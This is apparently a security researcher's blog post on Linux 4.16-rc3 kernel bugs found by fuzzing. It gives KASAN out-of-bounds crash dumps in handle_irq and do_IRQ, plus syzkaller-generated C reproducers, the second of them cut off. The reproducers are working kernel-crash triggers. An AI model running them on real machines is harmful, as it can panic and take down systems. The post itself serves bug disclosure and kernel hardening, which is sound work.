---
title: Linux Kernel - 2018-03-1 Founds
date: 2018-03-01
update: 2018-03-06
tags:
  - Security
  - Linux-Kernel
keywords:
  - 0-day
  - Bug
---

## handle_irq - OOBs

### Call Trace (Dump)

```c
BUG: KASAN: alloca-out-of-bounds in handle_irq+0x218/0x2f3
Read of size 8 at addr ffff88007b086240 by task syzkaller734473/2831

CPU: 0 PID: 2831 Comm: syzkaller734473 Not tainted 4.16.0-rc3+ #2
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
Call Trace:
 <IRQ>
 dump_stack+0x127/0x213
 print_address_description+0x60/0x22b
 kasan_report.cold.6+0xac/0x2f4
 </IRQ>

The buggy address belongs to the page:
page:ffffea0001ec2180 count:0 mapcount:0 mapping:0000000000000000 index:0xffff88007b087dd0
flags: 0x500000000000000()
raw: 0500000000000000 0000000000000000 ffff88007b087dd0 00000000ffffffff
raw: 0000000000000000 dead000000000200 0000000000000000 0000000000000000
page dumped because: kasan: bad access detected

Memory state around the buggy address:
 ffff88007b086100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 ffff88007b086180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
>ffff88007b086200: 00 00 00 00 00 00 00 00 cb cb cb cb 00 00 00 00
                                           ^
 ffff88007b086280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 ffff88007b086300: 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00
==================================================================
Kernel panic - not syncing: panic_on_warn set ...

CPU: 0 PID: 2831 Comm: syzkaller734473 Tainted: G    B            4.16.0-rc3+ #2
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
Call Trace:
 <IRQ>
 dump_stack+0x127/0x213
 panic+0x1f8/0x46f
 kasan_end_report+0x43/0x49
 kasan_report.cold.6+0xc8/0x2f4
 </IRQ>
Dumping ftrace buffer:
   (ftrace buffer empty)
Kernel Offset: 0x26800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
Rebooting in 86400 seconds..
```

### PoC

```c
#define _GNU_SOURCE

#include <endian.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <sys/prctl.h>
#include <dirent.h>
#include <sys/mount.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <linux/net.h>
#include <netinet/in.h>
#include <sys/socket.h>

__attribute__((noreturn)) static void doexit(int status)
{
	volatile unsigned i;
	syscall(__NR_exit_group, status);
	for (i = 0;; i++) {
	}
}
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

const int kFailStatus = 67;
const int kRetryStatus = 69;

  static void fail(const char* msg, ...)
{
	int e = errno;
	va_list args;
	va_start(args, msg);
	vfprintf(stderr, msg, args);
	va_end(args);
	fprintf(stderr, " (errno %d)\n", e);
	doexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);
}

  static void exitf(const char* msg, ...)
{
	int e = errno;
	va_list args;
	va_start(args, msg);
	vfprintf(stderr, msg, args);
	va_end(args);
	fprintf(stderr, " (errno %d)\n", e);
	doexit(kRetryStatus);
}

static uint64_t current_time_ms()
{
	struct timespec ts;

	if (clock_gettime(CLOCK_MONOTONIC, &ts))
		fail("clock_gettime failed");
	return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static void use_temporary_dir()
{
	char tmpdir_template[] = "./syzkaller.XXXXXX";
	char* tmpdir = mkdtemp(tmpdir_template);
	if (!tmpdir)
		fail("failed to mkdtemp");
	if (chmod(tmpdir, 0777))
		fail("failed to chmod");
	if (chdir(tmpdir))
		fail("failed to chdir");
}

static void loop();

static void sandbox_common()
{
	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
	setpgrp();
	setsid();

	struct rlimit rlim;
	rlim.rlim_cur = rlim.rlim_max = 128 << 20;
	setrlimit(RLIMIT_AS, &rlim);
	rlim.rlim_cur = rlim.rlim_max = 8 << 20;
	setrlimit(RLIMIT_MEMLOCK, &rlim);
	rlim.rlim_cur = rlim.rlim_max = 1 << 20;
	setrlimit(RLIMIT_FSIZE, &rlim);
	rlim.rlim_cur = rlim.rlim_max = 1 << 20;
	setrlimit(RLIMIT_STACK, &rlim);
	rlim.rlim_cur = rlim.rlim_max = 0;
	setrlimit(RLIMIT_CORE, &rlim);

#define CLONE_NEWCGROUP 0x02000000

	if (unshare(CLONE_NEWNS)) {
	}
	if (unshare(CLONE_NEWIPC)) {
	}
	if (unshare(CLONE_NEWCGROUP)) {
	}
	if (unshare(CLONE_NEWUTS)) {
	}
	if (unshare(CLONE_SYSVSEM)) {
	}
}

static int do_sandbox_none(void)
{
	if (unshare(CLONE_NEWPID)) {
	}
	int pid = fork();
	if (pid < 0)
		fail("sandbox fork failed");
	if (pid)
		return pid;

	sandbox_common();
	if (unshare(CLONE_NEWNET)) {
	}

	loop();
	doexit(1);
}

#define XT_TABLE_SIZE 1536
#define XT_MAX_ENTRIES 10

struct xt_counters {
	uint64_t pcnt, bcnt;
};

struct ipt_getinfo {
	char name[32];
	unsigned int valid_hooks;
	unsigned int hook_entry[5];
	unsigned int underflow[5];
	unsigned int num_entries;
	unsigned int size;
};

struct ipt_get_entries {
	char name[32];
	unsigned int size;
	void* entrytable[XT_TABLE_SIZE / sizeof(void*)];
};

struct ipt_replace {
	char name[32];
	unsigned int valid_hooks;
	unsigned int num_entries;
	unsigned int size;
	unsigned int hook_entry[5];
	unsigned int underflow[5];
	unsigned int num_counters;
	struct xt_counters* counters;
	char entrytable[XT_TABLE_SIZE];
};

struct ipt_table_desc {
	const char* name;
	struct ipt_getinfo info;
	struct ipt_replace replace;
};

static struct ipt_table_desc ipv4_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "mangle"},
    {.name = "raw"},
    {.name = "security"},
};

static struct ipt_table_desc ipv6_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "mangle"},
    {.name = "raw"},
    {.name = "security"},
};

#define IPT_BASE_CTL 64
#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)
#define IPT_SO_GET_INFO (IPT_BASE_CTL)
#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)

struct arpt_getinfo {
	char name[32];
	unsigned int valid_hooks;
	unsigned int hook_entry[3];
	unsigned int underflow[3];
	unsigned int num_entries;
	unsigned int size;
};

struct arpt_get_entries {
	char name[32];
	unsigned int size;
	void* entrytable[XT_TABLE_SIZE / sizeof(void*)];
};

struct arpt_replace {
	char name[32];
	unsigned int valid_hooks;
	unsigned int num_entries;
	unsigned int size;
	unsigned int hook_entry[3];
	unsigned int underflow[3];
	unsigned int num_counters;
	struct xt_counters* counters;
	char entrytable[XT_TABLE_SIZE];
};

struct arpt_table_desc {
	const char* name;
	struct arpt_getinfo info;
	struct arpt_replace replace;
};

static struct arpt_table_desc arpt_tables[] = {
    {.name = "filter"},
};

#define ARPT_BASE_CTL 96
#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)
#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)
#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)

static void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)
{
	struct ipt_get_entries entries;
	socklen_t optlen;
	int fd, i;

	fd = socket(family, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(%d, SOCK_STREAM, IPPROTO_TCP)", family);
	for (i = 0; i < num_tables; i++) {
		struct ipt_table_desc* table = &tables[i];
		strcpy(table->info.name, table->name);
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->info);
		if (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(IPT_SO_GET_INFO)");
		}
		if (table->info.size > sizeof(table->replace.entrytable))
			fail("table size is too large: %u", table->info.size);
		if (table->info.num_entries > XT_MAX_ENTRIES)
			fail("too many counters: %u", table->info.num_entries);
		memset(&entries, 0, sizeof(entries));
		strcpy(entries.name, table->name);
		entries.size = table->info.size;
		optlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;
		if (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))
			fail("getsockopt(IPT_SO_GET_ENTRIES)");
		table->replace.valid_hooks = table->info.valid_hooks;
		table->replace.num_entries = table->info.num_entries;
		table->replace.size = table->info.size;
		memcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));
		memcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));
		memcpy(table->replace.entrytable, entries.entrytable, table->info.size);
	}
	close(fd);
}

static void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)
{
	struct xt_counters counters[XT_MAX_ENTRIES];
	struct ipt_get_entries entries;
	struct ipt_getinfo info;
	socklen_t optlen;
	int fd, i;

	fd = socket(family, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(%d, SOCK_STREAM, IPPROTO_TCP)", family);
	for (i = 0; i < num_tables; i++) {
		struct ipt_table_desc* table = &tables[i];
		if (table->info.valid_hooks == 0)
			continue;
		memset(&info, 0, sizeof(info));
		strcpy(info.name, table->name);
		optlen = sizeof(info);
		if (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))
			fail("getsockopt(IPT_SO_GET_INFO)");
		if (memcmp(&table->info, &info, sizeof(table->info)) == 0) {
			memset(&entries, 0, sizeof(entries));
			strcpy(entries.name, table->name);
			entries.size = table->info.size;
			optlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;
			if (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))
				fail("getsockopt(IPT_SO_GET_ENTRIES)");
			if (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)
				continue;
		}
		table->replace.num_counters = info.num_entries;
		table->replace.counters = counters;
		optlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;
		if (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))
			fail("setsockopt(IPT_SO_SET_REPLACE)");
	}
	close(fd);
}

static void checkpoint_arptables(void)
{
	struct arpt_get_entries entries;
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {
		struct arpt_table_desc* table = &arpt_tables[i];
		strcpy(table->info.name, table->name);
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->info);
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(ARPT_SO_GET_INFO)");
		}
		if (table->info.size > sizeof(table->replace.entrytable))
			fail("table size is too large: %u", table->info.size);
		if (table->info.num_entries > XT_MAX_ENTRIES)
			fail("too many counters: %u", table->info.num_entries);
		memset(&entries, 0, sizeof(entries));
		strcpy(entries.name, table->name);
		entries.size = table->info.size;
		optlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))
			fail("getsockopt(ARPT_SO_GET_ENTRIES)");
		table->replace.valid_hooks = table->info.valid_hooks;
		table->replace.num_entries = table->info.num_entries;
		table->replace.size = table->info.size;
		memcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));
		memcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));
		memcpy(table->replace.entrytable, entries.entrytable, table->info.size);
	}
	close(fd);
}

static void reset_arptables()
{
	struct xt_counters counters[XT_MAX_ENTRIES];
	struct arpt_get_entries entries;
	struct arpt_getinfo info;
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {
		struct arpt_table_desc* table = &arpt_tables[i];
		if (table->info.valid_hooks == 0)
			continue;
		memset(&info, 0, sizeof(info));
		strcpy(info.name, table->name);
		optlen = sizeof(info);
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))
			fail("getsockopt(ARPT_SO_GET_INFO)");
		if (memcmp(&table->info, &info, sizeof(table->info)) == 0) {
			memset(&entries, 0, sizeof(entries));
			strcpy(entries.name, table->name);
			entries.size = table->info.size;
			optlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;
			if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))
				fail("getsockopt(ARPT_SO_GET_ENTRIES)");
			if (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)
				continue;
		}
		table->replace.num_counters = info.num_entries;
		table->replace.counters = counters;
		optlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;
		if (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))
			fail("setsockopt(ARPT_SO_SET_REPLACE)");
	}
	close(fd);
}
#include <linux/if.h>
#include <linux/netfilter_bridge/ebtables.h>

struct ebt_table_desc {
	const char* name;
	struct ebt_replace replace;
	char entrytable[XT_TABLE_SIZE];
};

static struct ebt_table_desc ebt_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "broute"},
};

static void checkpoint_ebtables(void)
{
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {
		struct ebt_table_desc* table = &ebt_tables[i];
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->replace);
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(EBT_SO_GET_INIT_INFO)");
		}
		if (table->replace.entries_size > sizeof(table->entrytable))
			fail("table size is too large: %u", table->replace.entries_size);
		table->replace.num_counters = 0;
		table->replace.entries = table->entrytable;
		optlen = sizeof(table->replace) + table->replace.entries_size;
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))
			fail("getsockopt(EBT_SO_GET_INIT_ENTRIES)");
	}
	close(fd);
}

static void reset_ebtables()
{
	struct ebt_replace replace;
	char entrytable[XT_TABLE_SIZE];
	socklen_t optlen;
	unsigned i, j, h;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {
		struct ebt_table_desc* table = &ebt_tables[i];
		if (table->replace.valid_hooks == 0)
			continue;
		memset(&replace, 0, sizeof(replace));
		strcpy(replace.name, table->name);
		optlen = sizeof(replace);
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))
			fail("getsockopt(EBT_SO_GET_INFO)");
		replace.num_counters = 0;
		for (h = 0; h < NF_BR_NUMHOOKS; h++)
			table->replace.hook_entry[h] = 0;
		if (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {
			memset(&entrytable, 0, sizeof(entrytable));
			replace.entries = entrytable;
			optlen = sizeof(replace) + replace.entries_size;
			if (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))
				fail("getsockopt(EBT_SO_GET_ENTRIES)");
			if (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)
				continue;
		}
		for (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {
			if (table->replace.valid_hooks & (1 << h)) {
				table->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;
				j++;
			}
		}
		optlen = sizeof(table->replace) + table->replace.entries_size;
		if (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))
			fail("setsockopt(EBT_SO_SET_ENTRIES)");
	}
	close(fd);
}

static void checkpoint_net_namespace(void)
{
	checkpoint_ebtables();
	checkpoint_arptables();
	checkpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);
	checkpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);
}

static void reset_net_namespace(void)
{
	reset_ebtables();
	reset_arptables();
	reset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);
	reset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);
}

static void remove_dir(const char* dir)
{
	DIR* dp;
	struct dirent* ep;
	int iter = 0;
retry:
	dp = opendir(dir);
	if (dp == NULL) {
		if (errno == EMFILE) {
			exitf("opendir(%s) failed due to NOFILE, exiting", dir);
		}
		exitf("opendir(%s) failed", dir);
	}
	while ((ep = readdir(dp))) {
		if (strcmp(ep->d_name, ".") == 0 || strcmp(ep->d_name, "..") == 0)
			continue;
		char filename[FILENAME_MAX];
		snprintf(filename, sizeof(filename), "%s/%s", dir, ep->d_name);
		struct stat st;
		if (lstat(filename, &st))
			exitf("lstat(%s) failed", filename);
		if (S_ISDIR(st.st_mode)) {
			remove_dir(filename);
			continue;
		}
		int i;
		for (i = 0;; i++) {
			if (unlink(filename) == 0)
				break;
			if (errno == EROFS) {
				break;
			}
			if (errno != EBUSY || i > 100)
				exitf("unlink(%s) failed", filename);
			if (umount2(filename, MNT_DETACH))
				exitf("umount(%s) failed", filename);
		}
	}
	closedir(dp);
	int i;
	for (i = 0;; i++) {
		if (rmdir(dir) == 0)
			break;
		if (i < 100) {
			if (errno == EROFS) {
				break;
			}
			if (errno == EBUSY) {
				if (umount2(dir, MNT_DETACH))
					exitf("umount(%s) failed", dir);
				continue;
			}
			if (errno == ENOTEMPTY) {
				if (iter < 100) {
					iter++;
					goto retry;
				}
			}
		}
		exitf("rmdir(%s) failed", dir);
	}
}

static void test();

void loop()
{
	int iter;
	checkpoint_net_namespace();
	for (iter = 0;; iter++) {
		char cwdbuf[256];
		sprintf(cwdbuf, "./%d", iter);
		if (mkdir(cwdbuf, 0777))
			fail("failed to mkdir");
		int pid = fork();
		if (pid < 0)
			fail("loop fork failed");
		if (pid == 0) {
			prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
			setpgrp();
			if (chdir(cwdbuf))
				fail("failed to chdir");
			test();
			doexit(0);
		}
		int status = 0;
		uint64_t start = current_time_ms();
		for (;;) {
			int res = waitpid(-1, &status, __WALL | WNOHANG);
			if (res == pid)
				break;
			usleep(1000);
			if (current_time_ms() - start > 5 * 1000) {
				kill(-pid, SIGKILL);
				kill(pid, SIGKILL);
				while (waitpid(-1, &status, __WALL) != pid) {
				}
				break;
			}
		}
		remove_dir(cwdbuf);
		reset_net_namespace();
	}
}

uint64_t procid;
void test()
{
	syscall(__NR_pipe2, 0x20000040, 0x4000);
}

int main()
{
	syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
	char *cwd = get_current_dir_name();
	for (procid = 0; procid < 8; procid++) {
		if (fork() == 0) {
			for (;;) {
				if (chdir(cwd))
					fail("failed to chdir");
				use_temporary_dir();
				int pid = do_sandbox_none();
				int status = 0;
				while (waitpid(pid, &status, __WALL) != pid) {}
			}
		}
	}
	sleep(1000000);
	return 0;
}
```

funny, just one call, ```pipe2```.

## do_irq - alloca Out Of Bounds

### Call Trace (Dump)

```c
[  144.100193] BUG: KASAN: alloca-out-of-bounds in do_IRQ+0x14f/0x190
[  144.102273] Read of size 8 at addr ffff880071feef50 by task syz-executor7/3009
[  144.105120] 
[  144.105718] CPU: 0 PID: 3009 Comm: syz-executor7 Not tainted 4.16.0-rc3+ #5
[  144.108306] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  144.111094] Call Trace:
[  144.111818]  <IRQ>
[  144.112451]  dump_stack+0x127/0x213
[  144.113456]  ? _atomic_dec_and_lock+0x18d/0x18d
[  144.115195]  ? show_regs_print_info+0x12/0x12
[  144.117092]  ? do_IRQ+0x14f/0x190
[  144.118988]  print_address_description+0x60/0x22b
[  144.121262]  ? do_IRQ+0x14f/0x190
[  144.122434]  kasan_report.cold.6+0xac/0x2f4
[  144.123688]  ? do_IRQ+0x14f/0x190
[  144.125633]  ? common_interrupt+0xf/0xf
[  144.128281]  </IRQ>
[  144.129024]  ? crypto_shash_update+0x23d/0x2a0
[  144.133518]  ? kasan_unpoison_shadow+0x4/0x40
[  144.134680]  ? crypto_shash_update+0x24d/0x2a0
[  144.135996]  ? ext4_inode_csum.isra.59+0x562/0xef0
[  144.137176]  ? ext4_journalled_zero_new_buffers+0x4e0/0x4e0
[  144.138826]  ? _rcu_barrier+0x1850/0x1d60
[  144.147204]  ? _cond_resched+0x10/0x20
[  144.148327]  ? _cond_resched+0x10/0x20
[  144.149289]  ? __getblk_gfp+0xf2/0xa30
[  144.150261]  ? save_trace+0x300/0x300
[  144.151229]  ? map_id_up+0x178/0x3a0
[  144.152122]  ? make_kprojid+0x30/0x30
[  144.152970]  ? lock_downgrade+0x6d0/0x6d0
[  144.153854]  ? find_held_lock+0x33/0x1b0
[  144.154777]  ? from_kprojid+0x89/0xc0
[  144.155620]  ? ext4_inode_csum_set+0x17c/0x370
[  144.156750]  ? ext4_mark_iloc_dirty+0x1709/0x2cc0
[  144.158064]  ? ext4_chunk_trans_blocks+0x20/0x20
[  144.159246]  ? jbd2_write_access_granted.part.8+0x264/0x410
[  144.163218]  ? jbd2_journal_file_inode+0x5d0/0x5d0
[  144.164486]  ? rcu_note_context_switch+0x710/0x710
[  144.165676]  ? jbd2_journal_get_write_access+0x98/0xb0
[  144.166916]  ? __ext4_journal_get_write_access+0x143/0x200
[  144.168336]  ? ext4_mark_inode_dirty+0x220/0xac0
[  144.169455]  ? ext4_evict_inode+0xb33/0x19d0
[  144.170611]  ? ext4_expand_extra_isize+0x560/0x560
[  144.171777]  ? __lock_is_held+0xad/0x140
[  144.172798]  ? ext4_xattr_ensure_credits+0x81/0x320
[  144.173967]  ? ext4_xattr_delete_inode+0x269/0xe20
[  144.175159]  ? ext4_evict_inode+0x8f6/0x19d0
[  144.176233]  ? ext4_expand_extra_isize_ea+0x1a20/0x1a20
[  144.177557]  ? __sb_start_write+0x16b/0x2f0
[  144.178698]  ? __sb_start_write+0x171/0x2f0
[  144.179765]  ? ext4_evict_inode+0xb33/0x19d0
[  144.180905]  ? ext4_da_write_begin+0x1170/0x1170
[  144.182053]  ? evict+0x45f/0x8f0
[  144.182904]  ? lock_acquire+0x4a0/0x4a0
[  144.183842]  ? wb_wakeup+0xc0/0xc0
[  144.184705]  ? do_raw_spin_trylock+0x190/0x190
[  144.185652]  ? bit_waitqueue+0x30/0x30
[  144.186414]  ? ext4_da_write_begin+0x1170/0x1170
[  144.187468]  ? evict+0x498/0x8f0
[  144.188398]  ? destroy_inode+0x1e0/0x1e0
[  144.189355]  ? iput+0x623/0xbc0
[  144.193860]  ? lock_acquire+0x4a0/0x4a0
[  144.202122]  ? rcu_read_lock_sched_held+0x102/0x120
[  144.203252]  ? ext4_drop_inode+0x11e/0x400
[  144.204290]  ? do_raw_spin_trylock+0x190/0x190
[  144.205489]  ? _atomic_dec_and_lock+0xff/0x18d
[  144.207104]  ? cpumask_local_spread+0x2c0/0x2c0
[  144.210166]  ? fsnotify_grab_connector+0x18c/0x2e0
[  144.212062]  ? iput+0x62b/0xbc0
[  144.213507]  ? ext4_sync_fs+0xa00/0xa00
[  144.215476]  ? dispose_list+0x390/0x390
[  144.220125]  ? fsnotify_grab_connector+0x1bd/0x2e0
[  144.223298]  ? fsnotify_recalc_mask.part.8+0xa0/0xa0
[  144.230135]  ? fsnotify_first_mark+0x340/0x340
[  144.231357]  ? dentry_unlink_inode+0x483/0x5b0
[  144.232384]  ? release_dentry_name_snapshot+0x70/0x70
[  144.233609]  ? lock_downgrade+0x6d0/0x6d0
[  144.234590]  ? rcutorture_record_progress+0x10/0x10
[  144.238561]  ? lock_acquire+0x4a0/0x4a0
[  144.239920]  ? do_raw_spin_lock+0x1b0/0x1b0
[  144.241197]  ? dput.part.24+0x23d/0x950
[  144.242177]  ? d_delete+0x1ed/0x2c0
[  144.243104]  ? vfs_rmdir+0x386/0x470
[  144.244475]  ? do_rmdir+0x41c/0x5b0
[  144.245746]  ? user_path_create+0x40/0x40
[  144.247270]  ? __do_page_fault+0x4a3/0xe30
[  144.248801]  ? exit_to_usermode_loop+0x16d/0x230
[  144.250478]  ? exit_to_usermode_loop+0x1c6/0x230
[  144.251700]  ? syscall_slow_exit_work+0x4d0/0x4d0
[  144.252955]  ? do_syscall_64+0xb0/0x850
[  144.254232]  ? SyS_mkdir+0x2c0/0x2c0
[  144.255074]  ? do_syscall_64+0x25b/0x850
[  144.255911]  ? exit_to_usermode_loop+0x1c6/0x230
[  144.257570]  ? syscall_return_slowpath+0x4e0/0x4e0
[  144.259317]  ? syscall_return_slowpath+0x342/0x4e0
[  144.261118]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7
[  144.263090]  ? trace_hardirqs_off_thunk+0x1a/0x1c
[  144.264816]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7
[  144.266695] 
[  144.267257] The buggy address belongs to the page:
[  144.268975] page:ffffea0001c7fb80 count:0 mapcount:0 mapping:0000000000000000 index:0x0
[  144.271861] flags: 0x500000000000000()
[  144.273191] raw: 0500000000000000 0000000000000000 0000000000000000 00000000ffffffff
[  144.275851] raw: ffffea0001c7fba0 ffffea0001c7fba0 0000000000000000 0000000000000000
[  144.278015] page dumped because: kasan: bad access detected
[  144.279598] 
[  144.280163] Memory state around the buggy address:
[  144.281388]  ffff880071feee00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  144.283488]  ffff880071feee80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  144.285237] >ffff880071feef00: 00 00 00 00 ca ca ca ca 02 cb cb cb cb cb cb cb
[  144.287223]                                                  ^
[  144.288617]  ffff880071feef80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  144.290465]  ffff880071fef000: 00 00 00 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2
[  144.292215] ==================================================================
[  144.296633] Disabling lock debugging due to kernel taint
[  144.297823] Kernel panic - not syncing: panic_on_warn set ...
```

### PoC

generated by syz-repro.

```c
#define _GNU_SOURCE

#include <endian.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <sys/prctl.h>
#include <dirent.h>
#include <sys/mount.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <grp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_tun.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <net/if_arp.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <linux/net.h>
#include <netinet/in.h>
#include <sys/socket.h>

__attribute__((noreturn)) static void doexit(int status)
{
	volatile unsigned i;
	syscall(__NR_exit_group, status);
	for (i = 0;; i++) {
	}
}
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

const int kFailStatus = 67;
const int kRetryStatus = 69;

  static void fail(const char* msg, ...)
{
	int e = errno;
	va_list args;
	va_start(args, msg);
	vfprintf(stderr, msg, args);
	va_end(args);
	fprintf(stderr, " (errno %d)\n", e);
	doexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);
}

  static void exitf(const char* msg, ...)
{
	int e = errno;
	va_list args;
	va_start(args, msg);
	vfprintf(stderr, msg, args);
	va_end(args);
	fprintf(stderr, " (errno %d)\n", e);
	doexit(kRetryStatus);
}

static uint64_t current_time_ms()
{
	struct timespec ts;

	if (clock_gettime(CLOCK_MONOTONIC, &ts))
		fail("clock_gettime failed");
	return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static void use_temporary_dir()
{
	char tmpdir_template[] = "./syzkaller.XXXXXX";
	char* tmpdir = mkdtemp(tmpdir_template);
